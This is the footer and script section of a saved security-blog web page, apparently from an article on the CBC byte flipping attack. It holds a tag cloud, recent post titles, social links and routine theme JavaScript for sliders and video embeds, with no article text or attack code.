+<a href="http://resources.infosecinstitute.com/tag/vulnerability/" class="tag-link-39" title="13 topics" style="font-size: 10.3125pt;">vulnerability</a>
+<a href="http://resources.infosecinstitute.com/tag/wapt/" class="tag-link-31" title="6 topics" style="font-size: 8.4375pt;">wapt</a>
+<a href="http://resources.infosecinstitute.com/tag/wordpress/" class="tag-link-133" title="7 topics" style="font-size: 8.75pt;">wordpress</a></div>
+<div style="clear:both;"></div></div>				</article>
+
+				<article class="col">
+						<div id="recent-posts-3" class="footer-widget-col widget_recent_entries">		<h3>Recent Posts</h3>		<ul>
+					<li>
+				<a href="http://resources.infosecinstitute.com/hooking-system-service-dispatch-table-ssdt/">Hooking the System Service Dispatch Table (SSDT)</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/overview-os-fingerprinting/">Overview of OS Fingerprinting</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/hooking-system-calls-msrs/">Hooking System Calls Through MSRs</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/systematic-security-problems-offshoring/">The Systematic and Security Problems of Offshoring</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/average-mcse-salary/">Average MCSE Salary 2014</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/hooking-idt/">Hooking IDT</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/ios-application-security-part-31-problem-using-third-party-libraries-securing-apps/">IOS Application Security Part 31 – The problem with using third party libraries for securing your apps</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/building-cryptographically-secure-cloud-applications/">Building Cryptographically Secure Cloud Applications</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/hunting-shylock/">Hunting Shylock</a>
+						</li>
+					<li>
+				<a href="http://resources.infosecinstitute.com/gathering-information-via-photography/">Approaches to Information Gathering in Physical Penetration Testing – Part I: Gathering Information via Photography</a>
+						</li>
+				</ul>
+		<div style="clear:both;"></div></div>				</article>
+
+				<article class="col">
+				<div id="search-2" class="footer-widget-col widget_search"><h3>Search this site</h3><form class="search" action="http://resources.infosecinstitute.com/" method="get">
+	<fieldset>
+		<span class="text"><input name="s" id="s" type="text" value="" placeholder="Search ..."></span>
+	</fieldset>
+</form><div style="clear:both;"></div></div>				</article>
+
+				<article class="col last" style="padding-right: 0px;">
+				<div id="facebook-like-widget-3" class="footer-widget-col facebook_like"><h3>Like Us On Facebook == Stay Up To Date </h3>		<iframe src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/likebox.htm" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:292px; height: 95px;" allowtransparency="true"></iframe>
+		<div style="clear:both;"></div></div>				</article>
+			</section>
+		</div>
+	</footer>
+			<footer id="footer">
+		<div class="avada-row">
+						<ul class="social-networks">
+						<li class="facebook-icon"><a target="" href="https://www.facebook.com/infosecedu" style="text-indent:0px; color: white !important;">
+			<i class="fontawesome-icon medium circle-no icon-facebook" style="margin-right:5px; "></i></a>
+				<div class="popup">
+					<div class="holder">
+						<p>Facebook</p>
+					</div>
+				</div>
+			</li>
+									<li class="twitter-icon"><a target="" href="https://twitter.com/infosecedu" style="text-indent:0px; color: white !important;">
+			<i class="fontawesome-icon medium circle-no icon-twitter" style="margin-right:5px; "></i></a>
+				<div class="popup">
+					<div class="holder">
+						<p>Twitter</p>
+					</div>
+				</div>
+			</li>
+									<li class="linkedin-icon"><a target="" href="http://www.linkedin.com/company/infosec-institute" style="text-indent:0px; color: white !important;"><i class="fontawesome-icon medium circle-no icon-linkedin" style="margin-right: 5px;"></i></a>
+				<div class="popup">
+					<div class="holder">
+						<p>LinkedIn</p>
+					</div>
+				</div>
+			</li>
+									<li class="rss-icon"><a target="" href="http://resources.infosecinstitute.com/feed/" style="text-indent:0px; color: white !important;">
+                <i class="fontawesome-icon medium circle-no icon-rss" style="margin-right: 5px;"></i>
+                </a>
+				<div class="popup">
+					<div class="holder">
+						<p>RSS</p>
+					</div>
+				</div>
+			</li>
+																																																					</ul>
+					<ul class="copyright">
+				<li> Copyright © 2012 - InfoSec Institute | All Rights Reserved </li>
+			</ul>
+		</div>
+	</footer>
+		</div><!-- wrapper -->
+			<script type="text/javascript">
+(function($){
+  $("img.lazy").show().lazyload({effect: "fadeIn"});
+})(jQuery);
+</script>
+<script type="text/javascript">strx.start({"content":"#main","sidebar":"#sidebar","wait":"3000","debounce":"500","animate":"500","offsetTop":"0","offsetBottom":"0","debug":0,"outline":0,"findids":0,"dynamicTop":"","jsInHead":"","minHDiff":"0"});</script><script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/shCore.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/shBrushPhp.js"></script>
+<script type="text/javascript">
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "http://resources.infosecinstitute.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.83c";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = "http://resources.infosecinstitute.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.83c";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '?';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
+	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
+	SyntaxHighlighter.defaults['toolbar'] = false;
+	SyntaxHighlighter.all();
+</script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/modernizr.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.elastislide.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.prettyPhoto.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.isotope.min.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.cycle.lite.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.hoverIntent.minified.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.eislideshow.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/froogaloop.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.placeholder.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.waypoint.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/main.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/hoverIntent.js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var uberMenuSettings = {"speed":"300","trigger":"hoverIntent","orientation":"horizontal","transition":"slide","hoverInterval":"20","hoverTimeout":"400","removeConflicts":"on","autoAlign":"off","noconflict":"off","fullWidthSubs":"off","androidClick":"off","iOScloseButton":"on","loadGoogleMaps":"off","repositionOnLoad":"off"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/ubermenu.min.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.mousewheel.min.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.flexslider.min.js"></script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/jquery.easing(1).js"></script>
+<script type="text/javascript">
+/* <![CDATA[ */
+var mv_dynamic_to_top = {"text":"To Top","version":"0","min":"300","speed":"1100","easing":"easeInExpo","margin":"20"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/dynamic.to.top.min.js"></script><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/#" id="dynamic-to-top" style="display: inline;"><span>&nbsp;</span></a>
+
+
+<script type="text/javascript">
+	/*@cc_on
+	  @if (@_jscript_version == 10)
+	    document.write(' <link type= "text/css" rel="stylesheet" href="http://2we26u4fam7n16rz3a44uhbe1bq2.wpengine.netdna-cdn.com/wp-content/themes/Avada/css/ie10.css" />');
+	  @end
+	@*/
+	jQuery(document).ready(function() {
+		jQuery('.portfolio-wrapper').hide();
+	});
+	
+	function insertParam(url, parameterName, parameterValue, atStart){
+	    replaceDuplicates = true;
+	    if(url.indexOf('#') > 0){
+	        var cl = url.indexOf('#');
+	        urlhash = url.substring(url.indexOf('#'),url.length);
+	    } else {
+	        urlhash = '';
+	        cl = url.length;
+	    }
+	    sourceUrl = url.substring(0,cl);
+
+	    var urlParts = sourceUrl.split("?");
+	    var newQueryString = "";
+
+	    if (urlParts.length > 1)
+	    {
+	        var parameters = urlParts[1].split("&");
+	        for (var i=0; (i < parameters.length); i++)
+	        {
+	            var parameterParts = parameters[i].split("=");
+	            if (!(replaceDuplicates && parameterParts[0] == parameterName))
+	            {
+	                if (newQueryString == "")
+	                    newQueryString = "?";
+	                else
+	                    newQueryString += "&";
+	                newQueryString += parameterParts[0] + "=" + (parameterParts[1]?parameterParts[1]:'');
+	            }
+	        }
+	    }
+	    if (newQueryString == "")
+	        newQueryString = "?";
+
+	    if(atStart){
+	        newQueryString = '?'+ parameterName + "=" + parameterValue + (newQueryString.length>1?'&'+newQueryString.substring(1):'');
+	    } else {
+	        if (newQueryString !== "" && newQueryString != '?')
+	            newQueryString += "&";
+	        newQueryString += parameterName + "=" + (parameterValue?parameterValue:'');
+	    }
+	    return urlParts[0] + newQueryString + urlhash;
+	};
+	
+	
+	
+	
+	jQuery(window).load(function() {
+	jQuery('.portfolio-wrapper').fadeIn();
+		jQuery('.portfolio-one .portfolio-wrapper').isotope({
+			// options
+			itemSelector: '.portfolio-item',
+			layoutMode: 'straightDown',
+			transformsEnabled: false
+		});
+
+		jQuery('.portfolio-two .portfolio-wrapper, .portfolio-three .portfolio-wrapper, .portfolio-four .portfolio-wrapper').isotope({
+			// options
+			itemSelector: '.portfolio-item',
+			layoutMode: 'fitRows',
+			transformsEnabled: false
+		});
+
+		var iframes = jQuery('iframe');
+		jQuery.each(iframes, function(i, v) {
+			var src = jQuery(this).attr('src');
+			if(src) {
+				if(src.indexOf('vimeo') >= 1) {
+					jQuery(this).attr('id', 'player_'+(i+1));
+					var new_src = insertParam(src, 'api', '1', false);
+					var new_src_2 = insertParam(new_src, 'player_id', 'player_'+(i+1), false);
+					jQuery(this).attr('src', new_src_2);
+				}
+			}
+		});
+
+		var vimeoPlayers = jQuery('.flexslider').find('iframe'), player;
+
+		for (var i = 0, length = vimeoPlayers.length; i < length; i++) {
+		        player = vimeoPlayers[i];
+		        $f(player).addEvent('ready', ready);
+		}
+
+		function addEvent(element, eventName, callback) {
+		    if (element.addEventListener) {
+		        element.addEventListener(eventName, callback, false)
+		    } else {
+		        element.attachEvent(eventName, callback, false);
+		    }
+		}
+
+		function ready(player_id) {
+		    var froogaloop = $f(player_id);
+		    froogaloop.addEvent('play', function(data) {
+		     jQuery('.flexslider, .tfs-slider').flexslider("pause");
+		    });
+
+		    froogaloop.addEvent('pause', function(data) {
+		        jQuery('.flexslider, .tfs-slider').flexslider("play");
+		    });
+		}
+
+		jQuery('.tfs-slider').flexslider({
+			animation: "fade",
+			slideshow: true,
+			slideshowSpeed: 7000,
+			animationSpeed: 600,
+			smoothHeight: true,
+			pauseOnHover: false,
+			useCSS: false,
+			video: true,
+			start: function(slider) {
+		        if (slider.slides.eq(slider.currentSlide).find('iframe').length !== 0) {
+		           		           jQuery(slider).find('.flex-control-nav').hide();
+		           		       } else {
+		           		           jQuery(slider).find('.flex-control-nav').show();
+		           		       }
+			},
+		    before: function(slider) {
+		        if (slider.slides.eq(slider.currentSlide).find('iframe').length !== 0) {
+		           $f( slider.slides.eq(slider.currentSlide).find('iframe').attr('id') ).api('pause');
+		           /* ------------------  YOUTUBE FOR AUTOSLIDER ------------------ */
+		           playVideoAndPauseOthers(jQuery('.play3 iframe')[0]);
+		       }
+		    },
+		   	after: function(slider) {
+		        if (slider.slides.eq(slider.currentSlide).find('iframe').length !== 0) {
+		           		           jQuery(slider).find('.flex-control-nav').hide();
+		           		       } else {
+		           		           jQuery(slider).find('.flex-control-nav').show();
+		           		       }
+		    }
+		});
+		
+		jQuery('.flexslider').flexslider({
+			slideshow: true,
+			video: true,
+			pauseOnHover: false,
+			useCSS: false,
+			start: function(slider) {
+				if(slider.currentSlide !== undefined) {
+		        if (slider.slides.eq(slider.currentSlide).find('iframe').length !== 0) {
+		           		           jQuery(slider).find('.flex-control-nav').hide();
+		           		       } else {
+		           		           jQuery(slider).find('.flex-control-nav').show();
+		           		       }
+		   		}
+			},
+		    before: function(slider) {
+		        if (slider.slides.eq(slider.currentSlide).find('iframe').length !== 0) {
+		           $f( slider.slides.eq(slider.currentSlide).find('iframe').attr('id') ).api('pause');
+		           /* ------------------  YOUTUBE FOR AUTOSLIDER ------------------ */
+		           playVideoAndPauseOthers(jQuery('.play3 iframe')[0]);
+		       }
+		    },
+		   	after: function(slider) {
+		        if (slider.slides.eq(slider.currentSlide).find('iframe').length !== 0) {
+		           		           jQuery(slider).find('.flex-control-nav').hide();
+		           		       } else {
+		           		           jQuery(slider).find('.flex-control-nav').show();
+		           		       }
+		    }
+		});
+
+		function playVideoAndPauseOthers(frame) {
+			jQuery('iframe').each(function(i) {
+			var func = this === frame ? 'playVideo' : 'stopVideo';
+			this.contentWindow.postMessage('{"event":"command","func":"' + func + '","args":""}', '*');
+			});
+		}
+
+		/* ------------------ PREV & NEXT BUTTON FOR FLEXSLIDER (YOUTUBE) ------------------ */
+		jQuery('.flex-next, .flex-prev').click(function() {
+			playVideoAndPauseOthers(jQuery('.play3 iframe')[0]);
+		});
+
+		jQuery('.rev_slider_wrapper').each(function() {
+			if(jQuery(this).length >=1 && jQuery(this).find('.tp-bannershadow').length == 0) {
+				jQuery('<div class="shadow-left">').appendTo(this);
+				jQuery('<div class="shadow-right">').appendTo(this);
+
+				jQuery(this).addClass('avada-skin-rev');
+			}
+		});
+
+		jQuery('.tparrows').each(function() {
+			if(jQuery(this).css('visibility') == 'hidden') {
+				jQuery(this).remove();
+			}
+		});
+	});
+	jQuery(document).ready(function($) {
+		function onAfter(curr, next, opts, fwd) {
+		  var $ht = jQuery(this).height();
+
+		  //set the container's height to that of the current slide
+		  $(this).parent().animate({height: $ht});
+		}
+
+	    jQuery('.reviews').cycle({
+			fx: 'fade',
+			after: onAfter,
+						timeout: 4000					});
+
+		jQuery('.full-video, .video-shortcode, .wooslider .slide-content').fitVids();
+
+				/*$('.image').live('mouseenter', function(e) {
+			if(!$(this).hasClass('slided')) {
+				$(this).find('.image-extras').show().stop(true, true).animate({opacity: '1', left: '0'}, 400);
+				$(this).addClass('slided');
+			} else {
+				$(this).find('.image-extras').stop(true, true).fadeIn('normal');
+			}
+		});
+		$('.image-extras').mouseleave(function(e) {
+			$(this).fadeOut('normal');
+		});*/
+		
+		var ppArgs = {
+						animation_speed: 'fast',
+						overlay_gallery: true,
+			autoplay_slideshow: false,
+						slideshow: 5000,
+									opacity: 0.8,
+						show_title: true,
+			show_desc: true,
+					};
+
+		jQuery("a[rel^='prettyPhoto']").prettyPhoto(ppArgs);
+
+		
+		var mediaQuery = 'desk';
+
+		if (Modernizr.mq('only screen and (max-width: 600px)') || Modernizr.mq('only screen and (max-height: 520px)')) {
+
+			mediaQuery = 'mobile';
+			jQuery("a[rel^='prettyPhoto']").unbind('click');
+					} 
+
+		// Disables prettyPhoto if screen small
+		jQuery(window).resize(function() {
+			if ((Modernizr.mq('only screen and (max-width: 600px)') || Modernizr.mq('only screen and (max-height: 520px)')) && mediaQuery == 'desk') {
+				jQuery("a[rel^='prettyPhoto']").unbind('click.prettyphoto');
+								mediaQuery = 'mobile';
+			} else if (!Modernizr.mq('only screen and (max-width: 600px)') && !Modernizr.mq('only screen and (max-height: 520px)') && mediaQuery == 'mobile') {
+				jQuery("a[rel^='prettyPhoto']").prettyPhoto(ppArgs);
+								mediaQuery = 'desk';
+			}
+		});
+				jQuery('.side-nav li').hoverIntent({
+		over: function() {
+			if(jQuery(this).find('> .children').length >= 1) {
+				jQuery(this).find('> .children').stop(true, true).slideDown('slow');
+			}
+		},
+		out: function() {
+			if(!jQuery(this).find('.current_page_item').length) {
+				jQuery(this).find('.children').stop(true, true).slideUp('slow');
+			}
+		},
+		timeout: 500
+		});
+		
+        jQuery('#ei-slider').eislideshow({
+        	        	animation: 'sides',
+        	        	autoplay: true,
+        	        	slideshow_interval: 3000,
+        	        	        	speed: 800,
+        	        	        	thumbMaxWidth: 150        	        });
+
+        var retina = window.devicePixelRatio > 1 ? true : false;
+
+        	});
+	</script>
+
+
+
+<iframe name="oauth2relay260414238" id="oauth2relay260414238" src="./CBC Byte Flipping Attack—101 Approach - InfoSec Institute_files/postmessageRelay.htm" tabindex="-1" style="width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></body></html>
